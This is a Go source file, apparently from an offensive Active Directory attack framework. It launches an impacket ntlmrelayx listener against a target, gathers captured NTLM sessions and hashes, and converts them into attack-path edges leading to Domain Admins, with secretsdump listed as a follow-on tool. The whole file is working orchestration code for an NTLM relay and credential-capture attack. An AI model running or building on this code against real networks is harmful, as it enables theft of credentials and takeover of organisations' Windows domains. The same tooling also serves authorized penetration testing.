package runtime

import (
	"context"
	"fmt"
	"time"

	"adpack/core"
)

// RunRelayPhase starts an ntlmrelayx listener before the main pipeline,
// monitors captured material during execution, and returns materialized edges.
// Timeout controls how long to wait for captures after the pipeline finishes.
func RunRelayPhase(ctx context.Context, sup *ServiceSupervisor, cfg NTLMRelayConfig, timeout time.Duration) []core.PrivilegeEdge {
	svc := NewNTLMRelayService("ntlmrelayx-main", "NTLM Relay Listener", cfg)

	if err := sup.StartService(*svc); err != nil {
		fmt.Printf("[!] Failed to start ntlmrelayx: %v\n", err)
		return nil
	}

	svc = sup.Service("ntlmrelayx-main")
	if svc == nil {
		return nil
	}

	if err := StartNTLMRelayService(svc, cfg, ctx); err != nil {
		fmt.Printf("[!] Failed to start ntlmrelayx process: %v\n", err)
		return nil
	}

	fmt.Printf("[+] ntlmrelayx started on %s → %s\n", cfg.InterfaceIP, cfg.Target)

	// Collect events until timeout
	var edges []core.PrivilegeEdge
	timer := time.NewTimer(timeout)
	defer timer.Stop()

	done := make(chan struct{})
	go func() {
		defer close(done)
		for {
			select {
			case evt, ok := <-svc.Events:
				if !ok {
					return
				}
				fmt.Printf("[+] Relay event: %s — %v\n", evt.Type, evt.Data)
				if edge := materializeEdgeFromEvent(evt); edge != nil {
					edges = append(edges, *edge)
				}
			case <-timer.C:
				return
			}
		}
	}()

	<-done

	// Stop the relay
	if err := sup.StopService("ntlmrelayx-main"); err != nil {
		fmt.Printf("[!] Error stopping ntlmrelayx: %v\n", err)
	}

	fmt.Printf("[+] Relay phase complete: %d edge(s) materialized\n", len(edges))
	return edges
}

// materializeEdgeFromEvent converts a relay service event into a privilege edge.
// Only EvSessionCaptured and EvHashCaptured events produce edges.
// Source and target identities are extracted from capture-line regex data.
func materializeEdgeFromEvent(evt core.ServiceEvent) *core.PrivilegeEdge {
	if evt.Type != core.EvSessionCaptured && evt.Type != core.EvHashCaptured {
		return nil
	}

	raw, _ := evt.Data["raw"].(string)
	if raw == "" {
		return nil
	}

	accessRight := "RELAY_SESSION"
	if evt.Type == core.EvHashCaptured {
		accessRight = "RELAY_HASH"
	}

	sourceUser, _ := evt.Data["source_user"].(string)
	sourceDomain, _ := evt.Data["source_domain"].(string)
	if sourceUser == "" {
		sourceUser = "NT AUTHORITY\\Authenticated Users"
		sourceDomain = ""
	}
	sourcePrincipal := sourceUser
	if sourceDomain != "" {
		sourcePrincipal = sourceDomain + "\\" + sourceUser
	}

	targetDomain := sourceDomain
	if targetDomain == "" {
		targetDomain = "DOMAIN"
	}

	return &core.PrivilegeEdge{
		SourcePrincipal: sourcePrincipal,
		TargetPrincipal: targetDomain + "\\Domain Admins",
		AccessRight:     accessRight,
		EdgeType:        "relay",
		Domain:          targetDomain,
		Source:          "ntlmrelayx",
		Confidence:      0.7,
		Weight:          4,
		Exploitability:  0.8,
		Noise:           0.6,
		Requires:        []string{"impacket-ntlmrelayx", "impacket-secretsdump"},
		Preconditions: []core.ExecutionPrecondition{
			{Kind: core.PrecondPortOpen, Target: evt.ServiceID, Port: 445, Description: "SMB for relay target"},
		},
	}
}
